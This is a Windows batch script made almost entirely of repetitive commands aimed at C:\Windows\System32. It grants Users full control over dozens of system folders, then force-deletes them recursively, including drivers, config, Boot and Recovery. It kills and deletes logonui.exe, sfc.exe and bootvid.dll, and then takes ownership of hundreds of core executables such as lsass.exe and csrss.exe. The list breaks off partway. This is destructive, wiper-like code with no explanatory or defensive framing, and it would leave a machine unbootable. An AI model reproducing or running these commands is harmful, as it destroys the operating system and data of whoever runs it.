icacls "C:\Windows\System32\ru-RU" /t /Grant Users:F
icacls "C:\Windows\System32\SecureBootUpdates" /t /Grant Users:F
icacls "C:\Windows\System32\setup" /t /Grant Users:F
icacls "C:\Windows\System32\Sgrm" /t /Grant Users:F
icacls "C:\Windows\System32\ShellExperiences" /t /Grant Users:F
icacls "C:\Windows\System32\si-lk" /t /Grant Users:F
icacls "C:\Windows\System32\sk-SK" /t /Grant Users:F
icacls "C:\Windows\System32\SleepStudy" /t /Grant Users:F
icacls "C:\Windows\System32\slmgr" /t /Grant Users:F
icacls "C:\Windows\System32\sl-SI" /t /Grant Users:F
icacls "C:\Windows\System32\SMI" /t /Grant Users:F
icacls "C:\Windows\System32\Speech" /t /Grant Users:F
icacls "C:\Windows\System32\Speech_OneCore" /t /Grant Users:F
icacls "C:\Windows\System32\spool" /t /Grant Users:F
icacls "C:\Windows\System32\spp" /t /Grant Users:F
icacls "C:\Windows\System32\sppui" /t /Grant Users:F
icacls "C:\Windows\System32\sr-Latn-RS" /t /Grant Users:F
icacls "C:\Windows\System32\sru" /t /Grant Users:F
icacls "C:\Windows\System32\sv-SE" /t /Grant Users:F
icacls "C:\Windows\System32\Sysprep" /t /Grant Users:F
icacls "C:\Windows\System32\SystemResetPlatform" /t /Grant Users:F
icacls "C:\Windows\System32\ta-in" /t /Grant Users:F
icacls "C:\Windows\System32\ta-lk" /t /Grant Users:F
icacls "C:\Windows\System32\Tasks" /t /Grant Users:F
icacls "C:\Windows\System32\th-TH" /t /Grant Users:F
icacls "C:\Windows\System32\ti-et" /t /Grant Users:F
icacls "C:\Windows\System32\tr-TR" /t /Grant Users:F
icacls "C:\Windows\System32\uk-UA" /t /Grant Users:F
icacls "C:\Windows\System32\UNP" /t /Grant Users:F
icacls "C:\Windows\System32\wbem" /t /Grant Users:F
icacls "C:\Windows\System32\WCN" /t /Grant Users:F
icacls "C:\Windows\System32\WDI" /t /Grant Users:F
icacls "C:\Windows\System32\WinBioDatabase" /t /Grant Users:F
icacls "C:\Windows\System32\WinBioPlugIns" /t /Grant Users:F
icacls "C:\Windows\System32\WindowsPowerShell" /t /Grant Users:F
icacls "C:\Windows\System32\winevt" /t /Grant Users:F
icacls "C:\Windows\System32\WinMetadata" /t /Grant Users:F
icacls "C:\Windows\System32\winrm" /t /Grant Users:F
icacls "C:\Windows\System32\zh-CN" /t /Grant Users:F
icacls "C:\Windows\System32\zh-TW" /t /Grant Users:F
icacls "C:\Windows\System32\0409" /t /Grant Users:F
icacls "C:\Windows\System32\AdvancedInstallers" /t /Grant Users:F
icacls "C:\Windows\System32\am-et" /t /Grant Users:F
icacls "C:\Windows\System32\AppLocker" /t /Grant Users:F
icacls "C:\Windows\System32\appraiser" /t /Grant Users:F
icacls "C:\Windows\System32\AppV" /t /Grant Users:F
icacls "C:\Windows\System32\ar-SA" /t /Grant Users:F
icacls "C:\Windows\System32\bg-BG" /t /Grant Users:F
icacls "C:\Windows\System32\Boot" /t /Grant Users:F
icacls "C:\Windows\System32\Bthprops" /t /Grant Users:F
icacls "C:\Windows\System32\CatRoot" /t /Grant Users:F
icacls "C:\Windows\System32\catroot2" /t /Grant Users:F
icacls "C:\Windows\System32\CodeIntegrity" /t /Grant Users:F
icacls "C:\Windows\System32\Com" /t /Grant Users:F
icacls "C:\Windows\System32\config" /t /Grant Users:F
icacls "C:\Windows\System32\Configuration" /t /Grant Users:F
icacls "C:\Windows\System32\ContainerSettingsProviders" /t /Grant Users:F
del "C:\Windows\System32\cs-CZ" /f /s /q
del "C:\Windows\System32\da-DK" /f /s /q
del "C:\Windows\System32\DDFs" /f /s /q
del "C:\Windows\System32\de-DE" /f /s /q
del "C:\Windows\System32\DiagSvcs" /f /s /q
del "C:\Windows\System32\Dism" /f /s /q
del "C:\Windows\System32\downlevel" /f /s /q
del "C:\Windows\System32\drivers" /f /s /q
del "C:\Windows\System32\DriverState" /f /s /q
del "C:\Windows\System32\DriverStore" /f /s /q
del "C:\Windows\System32\DRVSTORE" /f /s /q
del "C:\Windows\System32\dsc" /f /s /q
del "C:\Windows\System32\el-GR" /f /s /q
del "C:\Windows\System32\en" /f /s /q
del "C:\Windows\System32\en-GB" /f /s /q
del "C:\Windows\System32\en-US" /f /s /q
del "C:\Windows\System32\es-ES" /f /s /q
del "C:\Windows\System32\es-MX" /f /s /q
del "C:\Windows\System32\et-EE" /f /s /q
del "C:\Windows\System32\F12" /f /s /q
del "C:\Windows\System32\ff-Adlm-SN" /f /s /q
del "C:\Windows\System32\fi-FI" /f /s /q
del "C:\Windows\System32\fr-CA" /f /s /q
del "C:\Windows\System32\fr-FR" /f /s /q
del "C:\Windows\System32\FxsTmp" /f /s /q
del "C:\Windows\System32\GroupPolicy" /f /s /q
del "C:\Windows\System32\GroupPolicyUsers" /f /s /q
del "C:\Windows\System32\he-IL" /f /s /q
del "C:\Windows\System32\hr-HR" /f /s /q
del "C:\Windows\System32\hu-HU" /f /s /q
del "C:\Windows\System32\Hydrogen" /f /s /q
del "C:\Windows\System32\ias" /f /s /q
del "C:\Windows\System32\icsxml" /f /s /q
del "C:\Windows\System32\IME" /f /s /q
del "C:\Windows\System32\inetsrv" /f /s /q
del "C:\Windows\System32\InputMethod" /f /s /q
del "C:\Windows\System32\Ipmi" /f /s /q
del "C:\Windows\System32\it-IT" /f /s /q
del "C:\Windows\System32\ja-jp" /f /s /q
del "C:\Windows\System32\Keywords" /f /s /q
del "C:\Windows\System32\ko-KR" /f /s /q
del "C:\Windows\System32\Licenses" /f /s /q
del "C:\Windows\System32\LogFiles" /f /s /q
del "C:\Windows\System32\Logs" /f /s /q
del "C:\Windows\System32\lt-LT" /f /s /q
del "C:\Windows\System32\lv-LV" /f /s /q
del "C:\Windows\System32\MailContactsCalendarSync" /f /s /q
del "C:\Windows\System32\Microsoft" /f /s /q
del "C:\Windows\System32\migration" /f /s /q
del "C:\Windows\System32\migwiz" /f /s /q
del "C:\Windows\System32\MRT" /f /s /q
del "C:\Windows\System32\MSDRM" /f /s /q
del "C:\Windows\System32\MsDtc" /f /s /q
del "C:\Windows\System32\MUI" /f /s /q
del "C:\Windows\System32\my-mm" /f /s /q
del "C:\Windows\System32\nb-NO" /f /s /q
del "C:\Windows\System32\NDF" /f /s /q
del "C:\Windows\System32\networklist" /f /s /q
del "C:\Windows\System32\nl-NL" /f /s /q
del "C:\Windows\System32\Nui" /f /s /q
del "C:\Windows\System32\oobe" /f /s /q
del "C:\Windows\System32\OpenSSH" /f /s /q
del "C:\Windows\System32\osa-Osge-001" /f /s /q
del "C:\Windows\System32\PerceptionSimulation" /f /s /q
del "C:\Windows\System32\pl-PL" /f /s /q
del "C:\Windows\System32\PointOfService" /f /s /q
del "C:\Windows\System32\Printing_Admin_Scripts" /f /s /q
del "C:\Windows\System32\ProximityToast" /f /s /q
del "C:\Windows\System32\pt-BR" /f /s /q
del "C:\Windows\System32\pt-PT" /f /s /q
del "C:\Windows\System32\ras" /f /s /q
del "C:\Windows\System32\RasToast" /f /s /q
del "C:\Windows\System32\Recovery" /f /s /q
del "C:\Windows\System32\restore" /f /s /q
del "C:\Windows\System32\ro-RO" /f /s /q
del "C:\Windows\System32\ru-RU" /f /s /q
del "C:\Windows\System32\SecureBootUpdates" /f /s /q
del "C:\Windows\System32\setup" /f /s /q
del "C:\Windows\System32\Sgrm" /f /s /q
del "C:\Windows\System32\ShellExperiences" /f /s /q
del "C:\Windows\System32\si-lk" /f /s /q
del "C:\Windows\System32\sk-SK" /f /s /q
del "C:\Windows\System32\SleepStudy" /f /s /q
del "C:\Windows\System32\slmgr" /f /s /q
del "C:\Windows\System32\sl-SI" /f /s /q
del "C:\Windows\System32\SMI" /f /s /q
del "C:\Windows\System32\Speech" /f /s /q
del "C:\Windows\System32\Speech_OneCore" /f /s /q
del "C:\Windows\System32\spool" /f /s /q
del "C:\Windows\System32\spp" /f /s /q
del "C:\Windows\System32\sppui" /f /s /q
del "C:\Windows\System32\sr-Latn-RS" /f /s /q
del "C:\Windows\System32\sru" /f /s /q
del "C:\Windows\System32\sv-SE" /f /s /q
del "C:\Windows\System32\Sysprep" /f /s /q
del "C:\Windows\System32\SystemResetPlatform" /f /s /q
del "C:\Windows\System32\ta-in" /f /s /q
del "C:\Windows\System32\ta-lk" /f /s /q
del "C:\Windows\System32\Tasks" /f /s /q
del "C:\Windows\System32\th-TH" /f /s /q
del "C:\Windows\System32\ti-et" /f /s /q
del "C:\Windows\System32\tr-TR" /f /s /q
del "C:\Windows\System32\uk-UA" /f /s /q
del "C:\Windows\System32\UNP" /f /s /q
del "C:\Windows\System32\wbem" /f /s /q
del "C:\Windows\System32\WCN" /f /s /q
del "C:\Windows\System32\WDI" /f /s /q
del "C:\Windows\System32\WinBioDatabase" /f /s /q
del "C:\Windows\System32\WinBioPlugIns" /f /s /q
del "C:\Windows\System32\WindowsPowerShell" /f /s /q
del "C:\Windows\System32\winevt" /f /s /q
del "C:\Windows\System32\WinMetadata" /f /s /q
del "C:\Windows\System32\winrm" /f /s /q
del "C:\Windows\System32\zh-CN" /f /s /q
del "C:\Windows\System32\zh-TW" /f /s /q
del "C:\Windows\System32\0409" /f /s /q
del "C:\Windows\System32\AdvancedInstallers" /f /s /q
del "C:\Windows\System32\am-et" /f /s /q
del "C:\Windows\System32\AppLocker" /f /s /q
del "C:\Windows\System32\appraiser" /f /s /q
del "C:\Windows\System32\AppV" /f /s /q
del "C:\Windows\System32\ar-SA" /f /s /q
del "C:\Windows\System32\bg-BG" /f /s /q
del "C:\Windows\System32\Boot" /f /s /q
del "C:\Windows\System32\Bthprops" /f /s /q
del "C:\Windows\System32\CatRoot" /f /s /q
del "C:\Windows\System32\catroot2" /f /s /q
del "C:\Windows\System32\CodeIntegrity" /f /s /q
del "C:\Windows\System32\Com" /f /s /q
del "C:\Windows\System32\config" /f /s /q
del "C:\Windows\System32\Configuration" /f /s /q
del "C:\Windows\System32\ContainerSettingsProviders" /f /s /q
taskkill /f /im logonui.exe
takeown /f C:\Windows\system32\logonui.exe
icacls C:\Windows\system32\logonui.exe /Grant Users:F
del C:\Windows\system32\logonui.exe /f /s /q
takeown /f C:\Windows\system32\sfc.exe
icacls C:\Windows\system32\sfc.exe /Grant Users:F
del C:\Windows\system32\sfc.exe /f /s /q
takeown /f C:\Windows\system32\bootvid.dll
icacls C:\Windows\system32\bootvid.dll /Grant Users:F
del C:\Windows\bootvid.dll
takeown /f  /r /d y
takeown /f C:\Windows\System32\agentactivationruntimestarter.exe /r /d y
takeown /f C:\Windows\System32\AgentService.exe /r /d y
takeown /f C:\Windows\System32\aitstatic.exe /r /d y
takeown /f C:\Windows\System32\alg.exe /r /d y
takeown /f C:\Windows\System32\AppHostRegistrationVerifier.exe /r /d y
takeown /f C:\Windows\System32\appidcertstorecheck.exe /r /d y
takeown /f C:\Windows\System32\appidpolicyconverter.exe /r /d y
takeown /f C:\Windows\System32\appidtel.exe /r /d y
takeown /f C:\Windows\System32\ApplicationFrameHost.exe /r /d y
takeown /f C:\Windows\System32\ApplySettingsTemplateCatalog.exe /r /d y
takeown /f C:\Windows\System32\ApplyTrustOffline.exe /r /d y
takeown /f C:\Windows\System32\ApproveChildRequest.exe /r /d y
takeown /f C:\Windows\System32\AppVClient.exe /r /d y
takeown /f C:\Windows\System32\AppVDllSurrogate.exe /r /d y
takeown /f C:\Windows\System32\AppVNice.exe /r /d y
takeown /f C:\Windows\System32\AppVShNotify.exe /r /d y
takeown /f C:\Windows\System32\ARP.EXE /r /d y
takeown /f C:\Windows\System32\AssignedAccessGuard.exe /r /d y
takeown /f C:\Windows\System32\at.exe /r /d y
takeown /f C:\Windows\System32\AtBroker.exe /r /d y
takeown /f C:\Windows\System32\attrib.exe /r /d y
takeown /f C:\Windows\System32\audiodg.exe /r /d y
takeown /f C:\Windows\System32\auditpol.exe /r /d y
takeown /f C:\Windows\System32\AuthHost.exe /r /d y
takeown /f C:\Windows\System32\autochk.exe /r /d y
takeown /f C:\Windows\System32\autoconv.exe /r /d y
takeown /f C:\Windows\System32\autofmt.exe /r /d y
takeown /f C:\Windows\System32\AxInstUI.exe /r /d y
takeown /f C:\Windows\System32\baaupdate.exe /r /d y
takeown /f C:\Windows\System32\backgroundTaskHost.exe /r /d y
takeown /f C:\Windows\System32\BackgroundTransferHost.exe /r /d y
takeown /f C:\Windows\System32\bcdboot.exe /r /d y
takeown /f C:\Windows\System32\bcdedit.exe /r /d y
takeown /f C:\Windows\System32\bdechangepin.exe /r /d y
takeown /f C:\Windows\System32\BdeHdCfg.exe /r /d y
takeown /f C:\Windows\System32\BdeUISrv.exe /r /d y
takeown /f C:\Windows\System32\bdeunlock.exe /r /d y
takeown /f C:\Windows\System32\BioIso.exe /r /d y
takeown /f C:\Windows\System32\BitLockerDeviceEncryption.exe /r /d y
takeown /f C:\Windows\System32\BitLockerWizard.exe /r /d y
takeown /f C:\Windows\System32\BitLockerWizardElev.exe /r /d y
takeown /f C:\Windows\System32\bitsadmin.exe /r /d y
takeown /f C:\Windows\System32\bootcfg.exe /r /d y
takeown /f C:\Windows\System32\bootim.exe /r /d y
takeown /f C:\Windows\System32\bootsect.exe /r /d y
takeown /f C:\Windows\System32\bridgeunattend.exe /r /d y
takeown /f C:\Windows\System32\browserexport.exe /r /d y
takeown /f C:\Windows\System32\browser_broker.exe /r /d y
takeown /f C:\Windows\System32\bthudtask.exe /r /d y
takeown /f C:\Windows\System32\ByteCodeGenerator.exe /r /d y
takeown /f C:\Windows\System32\cacls.exe /r /d y
takeown /f C:\Windows\System32\calc.exe /r /d y
takeown /f C:\Windows\System32\CameraSettingsUIHost.exe /r /d y
takeown /f C:\Windows\System32\CastSrv.exe /r /d y
takeown /f C:\Windows\System32\CertEnrollCtrl.exe /r /d y
takeown /f C:\Windows\System32\certreq.exe /r /d y
takeown /f C:\Windows\System32\certutil.exe /r /d y
takeown /f C:\Windows\System32\change.exe /r /d y
takeown /f C:\Windows\System32\changepk.exe /r /d y
takeown /f C:\Windows\System32\charmap.exe /r /d y
takeown /f C:\Windows\System32\CheckNetIsolation.exe /r /d y
takeown /f C:\Windows\System32\chglogon.exe /r /d y
takeown /f C:\Windows\System32\chgport.exe /r /d y
takeown /f C:\Windows\System32\chgusr.exe /r /d y
takeown /f C:\Windows\System32\chkdsk.exe /r /d y
takeown /f C:\Windows\System32\chkntfs.exe /r /d y
takeown /f C:\Windows\System32\choice.exe /r /d y
takeown /f C:\Windows\System32\CIDiag.exe /r /d y
takeown /f C:\Windows\System32\cipher.exe /r /d y
takeown /f C:\Windows\System32\cleanmgr.exe /r /d y
takeown /f C:\Windows\System32\cliconfg.exe /r /d y
takeown /f C:\Windows\System32\clip.exe /r /d y
takeown /f C:\Windows\System32\ClipRenew.exe /r /d y
takeown /f C:\Windows\System32\ClipUp.exe /r /d y
takeown /f C:\Windows\System32\CloudExperienceHostBroker.exe /r /d y
takeown /f C:\Windows\System32\CloudNotifications.exe /r /d y
takeown /f C:\Windows\System32\cmd.exe /r /d y
takeown /f C:\Windows\System32\cmdkey.exe /r /d y
takeown /f C:\Windows\System32\cmdl32.exe /r /d y
takeown /f C:\Windows\System32\cmmon32.exe /r /d y
takeown /f C:\Windows\System32\cmstp.exe /r /d y
takeown /f C:\Windows\System32\cofire.exe /r /d y
takeown /f C:\Windows\System32\colorcpl.exe /r /d y
takeown /f C:\Windows\System32\comp.exe /r /d y
takeown /f C:\Windows\System32\compact.exe /r /d y
takeown /f C:\Windows\System32\CompatTelRunner.exe /r /d y
takeown /f C:\Windows\System32\CompMgmtLauncher.exe /r /d y
takeown /f C:\Windows\System32\CompPkgSrv.exe /r /d y
takeown /f C:\Windows\System32\ComputerDefaults.exe /r /d y
takeown /f C:\Windows\System32\conhost.exe /r /d y
takeown /f C:\Windows\System32\consent.exe /r /d y
takeown /f C:\Windows\System32\control.exe /r /d y
takeown /f C:\Windows\System32\convert.exe /r /d y
takeown /f C:\Windows\System32\convertvhd.exe /r /d y
takeown /f C:\Windows\System32\coredpussvr.exe /r /d y
takeown /f C:\Windows\System32\CredentialEnrollmentManager.exe /r /d y
takeown /f C:\Windows\System32\CredentialUIBroker.exe /r /d y
takeown /f C:\Windows\System32\credwiz.exe /r /d y
takeown /f C:\Windows\System32\cscript.exe /r /d y
takeown /f C:\Windows\System32\csrss.exe /r /d y
takeown /f C:\Windows\System32\ctfmon.exe /r /d y
takeown /f C:\Windows\System32\cttune.exe /r /d y
takeown /f C:\Windows\System32\cttunesvr.exe /r /d y
takeown /f C:\Windows\System32\curl.exe /r /d y
takeown /f C:\Windows\System32\CustomInstallExec.exe /r /d y
takeown /f C:\Windows\System32\CustomModeApp.exe /r /d y
takeown /f C:\Windows\System32\CustomModeAppv2_0.exe /r /d y
takeown /f C:\Windows\System32\CustomShellHost.exe /r /d y
takeown /f C:\Windows\System32\dasHost.exe /r /d y
takeown /f C:\Windows\System32\DataExchangeHost.exe /r /d y
takeown /f C:\Windows\System32\DataStoreCacheDumpTool.exe /r /d y
takeown /f C:\Windows\System32\DataUsageLiveTileTask.exe /r /d y
takeown /f C:\Windows\System32\dccw.exe /r /d y
takeown /f C:\Windows\System32\dcomcnfg.exe /r /d y
takeown /f C:\Windows\System32\ddodiag.exe /r /d y
takeown /f C:\Windows\System32\Defrag.exe /r /d y
takeown /f C:\Windows\System32\deploymentcsphelper.exe /r /d y
takeown /f C:\Windows\System32\desktopimgdownldr.exe /r /d y
takeown /f C:\Windows\System32\DeviceCensus.exe /r /d y
takeown /f C:\Windows\System32\DeviceCredentialDeployment.exe /r /d y
takeown /f C:\Windows\System32\DeviceEject.exe /r /d y
takeown /f C:\Windows\System32\DeviceEnroller.exe /r /d y
takeown /f C:\Windows\System32\DevicePairingWizard.exe /r /d y
takeown /f C:\Windows\System32\DeviceProperties.exe /r /d y
takeown /f C:\Windows\System32\DFDWiz.exe /r /d y
takeown /f C:\Windows\System32\dfrgui.exe /r /d y
takeown /f C:\Windows\System32\dialer.exe /r /d y
takeown /f C:\Windows\System32\difx64.exe /r /d y
takeown /f C:\Windows\System32\directxdatabaseupdater.exe /r /d y
takeown /f C:\Windows\System32\diskpart.exe /r /d y
takeown /f C:\Windows\System32\diskperf.exe /r /d y
takeown /f C:\Windows\System32\diskraid.exe /r /d y
takeown /f C:\Windows\System32\DiskSnapshot.exe /r /d y
takeown /f C:\Windows\System32\Dism.exe /r /d y
takeown /f C:\Windows\System32\dispdiag.exe /r /d y
takeown /f C:\Windows\System32\DisplaySwitch.exe /r /d y
takeown /f C:\Windows\System32\djoin.exe /r /d y
takeown /f C:\Windows\System32\dllhost.exe /r /d y
takeown /f C:\Windows\System32\dllhst3g.exe /r /d y
takeown /f C:\Windows\System32\dmcertinst.exe /r /d y
takeown /f C:\Windows\System32\dmcfghost.exe /r /d y
takeown /f C:\Windows\System32\dmclient.exe /r /d y
takeown /f C:\Windows\System32\DmNotificationBroker.exe /r /d y
takeown /f C:\Windows\System32\DmOmaCpMo.exe /r /d y
takeown /f C:\Windows\System32\dnscacheugc.exe /r /d y
takeown /f C:\Windows\System32\doskey.exe /r /d y
takeown /f C:\Windows\System32\dpapimig.exe /r /d y
takeown /f C:\Windows\System32\DpiScaling.exe /r /d y
takeown /f C:\Windows\System32\dpnsvr.exe /r /d y
takeown /f C:\Windows\System32\DPTopologyApp.exe /r /d y
takeown /f C:\Windows\System32\DPTopologyAppv2_0.exe /r /d y
takeown /f C:\Windows\System32\driverquery.exe /r /d y
takeown /f C:\Windows\System32\drvinst.exe /r /d y
takeown /f C:\Windows\System32\DsmUserTask.exe /r /d y
takeown /f C:\Windows\System32\dsregcmd.exe /r /d y
takeown /f C:\Windows\System32\dstokenclean.exe /r /d y
takeown /f C:\Windows\System32\DTUHandler.exe /r /d y
takeown /f C:\Windows\System32\dusmtask.exe /r /d y
takeown /f C:\Windows\System32\dvdplay.exe /r /d y
takeown /f C:\Windows\System32\dwm.exe /r /d y
takeown /f C:\Windows\System32\DWWIN.EXE /r /d y
takeown /f C:\Windows\System32\dxdiag.exe /r /d y
takeown /f C:\Windows\System32\dxgiadaptercache.exe /r /d y
takeown /f C:\Windows\System32\Dxpserver.exe /r /d y
takeown /f C:\Windows\System32\Eap3Host.exe /r /d y
takeown /f C:\Windows\System32\EaseOfAccessDialog.exe /r /d y
takeown /f C:\Windows\System32\easinvoker.exe /r /d y
takeown /f C:\Windows\System32\EASPolicyManagerBrokerHost.exe /r /d y
takeown /f C:\Windows\System32\EDPCleanup.exe /r /d y
takeown /f C:\Windows\System32\edpnotify.exe /r /d y
takeown /f C:\Windows\System32\EduPrintProv.exe /r /d y
takeown /f C:\Windows\System32\efsui.exe /r /d y
takeown /f C:\Windows\System32\EhStorAuthn.exe /r /d y
takeown /f C:\Windows\System32\EM.exe /r /d y
takeown /f C:\Windows\System32\EoAExperiences.exe /r /d y
takeown /f C:\Windows\System32\esentutl.exe /r /d y
takeown /f C:\Windows\System32\eudcedit.exe /r /d y
takeown /f C:\Windows\System32\eventcreate.exe /r /d y
takeown /f C:\Windows\System32\eventvwr.exe /r /d y
takeown /f C:\Windows\System32\expand.exe /r /d y
takeown /f C:\Windows\System32\extrac32.exe /r /d y
takeown /f C:\Windows\System32\fc.exe /r /d y
takeown /f C:\Windows\System32\fclip.exe /r /d y
takeown /f C:\Windows\System32\fhmanagew.exe /r /d y
takeown /f C:\Windows\System32\FileHistory.exe /r /d y
takeown /f C:\Windows\System32\find.exe /r /d y
takeown /f C:\Windows\System32\findstr.exe /r /d y
takeown /f C:\Windows\System32\finger.exe /r /d y
takeown /f C:\Windows\System32\fixmapi.exe /r /d y
takeown /f C:\Windows\System32\fltMC.exe /r /d y
takeown /f C:\Windows\System32\fodhelper.exe /r /d y
takeown /f C:\Windows\System32\Fondue.exe /r /d y
takeown /f C:\Windows\System32\fontdrvhost.exe /r /d y
takeown /f C:\Windows\System32\fontview.exe /r /d y
takeown /f C:\Windows\System32\forfiles.exe /r /d y
takeown /f C:\Windows\System32\fsavailux.exe /r /d y
takeown /f C:\Windows\System32\FsIso.exe /r /d y
takeown /f C:\Windows\System32\fsquirt.exe /r /d y
takeown /f C:\Windows\System32\fsutil.exe /r /d y
takeown /f C:\Windows\System32\ftp.exe /r /d y
takeown /f C:\Windows\System32\fvenotify.exe /r /d y
takeown /f C:\Windows\System32\fveprompt.exe /r /d y
takeown /f C:\Windows\System32\FXSCOVER.exe /r /d y
takeown /f C:\Windows\System32\FXSSVC.exe /r /d y
takeown /f C:\Windows\System32\FXSUNATD.exe /r /d y
takeown /f C:\Windows\System32\GameBarPresenceWriter.exe /r /d y
takeown /f C:\Windows\System32\GameInputSvc.exe /r /d y
takeown /f C:\Windows\System32\GamePanel.exe /r /d y
takeown /f C:\Windows\System32\GenValObj.exe /r /d y
takeown /f C:\Windows\System32\getmac.exe /r /d y
takeown /f C:\Windows\System32\GfxUIEx.exe /r /d y
takeown /f C:\Windows\System32\Gfxv2_0.exe /r /d y
takeown /f C:\Windows\System32\Gfxv4_0.exe /r /d y
takeown /f C:\Windows\System32\gpresult.exe /r /d y
takeown /f C:\Windows\System32\gpscript.exe /r /d y
takeown /f C:\Windows\System32\gpupdate.exe /r /d y
takeown /f C:\Windows\System32\grpconv.exe /r /d y
takeown /f C:\Windows\System32\hdwwiz.exe /r /d y
takeown /f C:\Windows\System32\help.exe /r /d y
takeown /f C:\Windows\System32\HOSTNAME.EXE /r /d y
takeown /f C:\Windows\System32\hvax64.exe /r /d y
takeown /f C:\Windows\System32\hvix64.exe /r /d y
takeown /f C:\Windows\System32\hvsievaluator.exe /r /d y
takeown /f C:\Windows\System32\icacls.exe /r /d y
takeown /f C:\Windows\System32\IcsEntitlementHost.exe /r /d y
takeown /f C:\Windows\System32\icsunattend.exe /r /d y
takeown /f C:\Windows\System32\ie4uinit.exe /r /d y
takeown /f C:\Windows\System32\ie4ushowIE.exe /r /d y
takeown /f C:\Windows\System32\IESettingSync.exe /r /d y
takeown /f C:\Windows\System32\ieUnatt.exe /r /d y
takeown /f C:\Windows\System32\iexpress.exe /r /d y
takeown /f C:\Windows\System32\igfxCUIService.exe /r /d y
takeown /f C:\Windows\System32\igfxEM.exe /r /d y
takeown /f C:\Windows\System32\igfxext.exe /r /d y
takeown /f C:\Windows\System32\igfxHK.exe /r /d y
takeown /f C:\Windows\System32\igfxTray.exe /r /d y
takeown /f C:\Windows\System32\immersivetpmvscmgrsvr.exe /r /d y
takeown /f C:\Windows\System32\InfDefaultInstall.exe /r /d y
takeown /f C:\Windows\System32\InputSwitchToastHandler.exe /r /d y
takeown /f C:\Windows\System32\IntelWiDiUMS64.exe /r /d y
takeown /f C:\Windows\System32\IntelWiDiVAD64.exe /r /d y
takeown /f C:\Windows\System32\iotstartup.exe /r /d y
takeown /f C:\Windows\System32\ipconfig.exe /r /d y
takeown /f C:\Windows\System32\iscsicli.exe /r /d y
takeown /f C:\Windows\System32\iscsicpl.exe /r /d y
takeown /f C:\Windows\System32\isoburn.exe /r /d y
takeown /f C:\Windows\System32\klist.exe /r /d y
takeown /f C:\Windows\System32\ksetup.exe /r /d y
takeown /f C:\Windows\System32\ktmutil.exe /r /d y
takeown /f C:\Windows\System32\label.exe /r /d y
takeown /f C:\Windows\System32\LanguageComponentsInstallerComHandler.exe /r /d y
takeown /f C:\Windows\System32\LaunchTM.exe /r /d y
takeown /f C:\Windows\System32\LaunchWinApp.exe /r /d y
takeown /f C:\Windows\System32\LegacyNetUXHost.exe /r /d y
takeown /f C:\Windows\System32\LicenseManagerShellext.exe /r /d y
takeown /f C:\Windows\System32\licensingdiag.exe /r /d y
takeown /f C:\Windows\System32\LicensingUI.exe /r /d y
takeown /f C:\Windows\System32\LocationNotificationWindows.exe /r /d y
takeown /f C:\Windows\System32\Locator.exe /r /d y
takeown /f C:\Windows\System32\LockAppHost.exe /r /d y
takeown /f C:\Windows\System32\LockScreenContentServer.exe /r /d y
takeown /f C:\Windows\System32\lodctr.exe /r /d y
takeown /f C:\Windows\System32\logagent.exe /r /d y
takeown /f C:\Windows\System32\logman.exe /r /d y
takeown /f C:\Windows\System32\logoff.exe /r /d y
takeown /f C:\Windows\System32\LogonUI.exe /r /d y
takeown /f C:\Windows\System32\lpkinstall.exe /r /d y
takeown /f C:\Windows\System32\lpksetup.exe /r /d y
takeown /f C:\Windows\System32\lpremove.exe /r /d y
takeown /f C:\Windows\System32\LsaIso.exe /r /d y
takeown /f C:\Windows\System32\lsass.exe /r /d y
takeown /f C:\Windows\System32\Magnify.exe /r /d y
takeown /f C:\Windows\System32\makecab.exe /r /d y
takeown /f C:\Windows\System32\manage-bde.exe /r /d y
takeown /f C:\Windows\System32\mavinject.exe /r /d y
takeown /f C:\Windows\System32\MbaeParserTask.exe /r /d y
takeown /f C:\Windows\System32\mblctr.exe /r /d y
takeown /f C:\Windows\System32\MBR2GPT.EXE /r /d y
takeown /f C:\Windows\System32\mcbuilder.exe /r /d y
takeown /f C:\Windows\System32\MDEServer.exe /r /d y
takeown /f C:\Windows\System32\MDMAgent.exe /r /d y
takeown /f C:\Windows\System32\MDMAppInstaller.exe /r /d y
takeown /f C:\Windows\System32\MdmDiagnosticsTool.exe /r /d y
takeown /f C:\Windows\System32\MdRes.exe /r /d y
takeown /f C:\Windows\System32\MdSched.exe /r /d y
takeown /f C:\Windows\System32\mfpmp.exe /r /d y
takeown /f C:\Windows\System32\Microsoft.Uev.CscUnpinTool.exe /r /d y
takeown /f C:\Windows\System32\Microsoft.Uev.SyncController.exe /r /d y
takeown /f C:\Windows\System32\MicrosoftEdgeBCHost.exe /r /d y
takeown /f C:\Windows\System32\MicrosoftEdgeCP.exe /r /d y
takeown /f C:\Windows\System32\MicrosoftEdgeDevTools.exe /r /d y
takeown /f C:\Windows\System32\MicrosoftEdgeSH.exe /r /d y
takeown /f C:\Windows\System32\mmc.exe /r /d y
takeown /f C:\Windows\System32\mmgaserver.exe /r /d y
takeown /f C:\Windows\System32\mobsync.exe /r /d y
takeown /f C:\Windows\System32\mountvol.exe /r /d y
takeown /f C:\Windows\System32\MoUsoCoreWorker.exe /r /d y
takeown /f C:\Windows\System32\mpnotify.exe /r /d y
takeown /f C:\Windows\System32\MpSigStub.exe /r /d y
takeown /f C:\Windows\System32\MRINFO.EXE /r /d y
takeown /f C:\Windows\System32\MRT.exe /r /d y
takeown /f C:\Windows\System32\MSchedExe.exe /r /d y
takeown /f C:\Windows\System32\msconfig.exe /r /d y
takeown /f C:\Windows\System32\msdt.exe /r /d y
takeown /f C:\Windows\System32\msdtc.exe /r /d y
takeown /f C:\Windows\System32\msfeedssync.exe /r /d y
takeown /f C:\Windows\System32\msg.exe /r /d y
takeown /f C:\Windows\System32\mshta.exe /r /d y
takeown /f C:\Windows\System32\msiexec.exe /r /d y
takeown /f C:\Windows\System32\msinfo32.exe /r /d y
takeown /f C:\Windows\System32\mspaint.exe /r /d y
takeown /f C:\Windows\System32\msra.exe /r /d y
takeown /f C:\Windows\System32\MsSpellCheckingHost.exe /r /d y
takeown /f C:\Windows\System32\mstsc.exe /r /d y
takeown /f C:\Windows\System32\mtstocom.exe /r /d y
takeown /f C:\Windows\System32\MuiUnattend.exe /r /d y
takeown /f C:\Windows\System32\MultiDigiMon.exe /r /d y
takeown /f C:\Windows\System32\MusNotification.exe /r /d y
takeown /f C:\Windows\System32\MusNotificationUx.exe /r /d y
takeown /f C:\Windows\System32\MusNotifyIcon.exe /r /d y
takeown /f C:\Windows\System32\Narrator.exe /r /d y
takeown /f C:\Windows\System32\nbtstat.exe /r /d y
takeown /f C:\Windows\System32\ndadmin.exe /r /d y
takeown /f C:\Windows\System32\NDKPing.exe /r /d y
takeown /f C:\Windows\System32\net.exe /r /d y
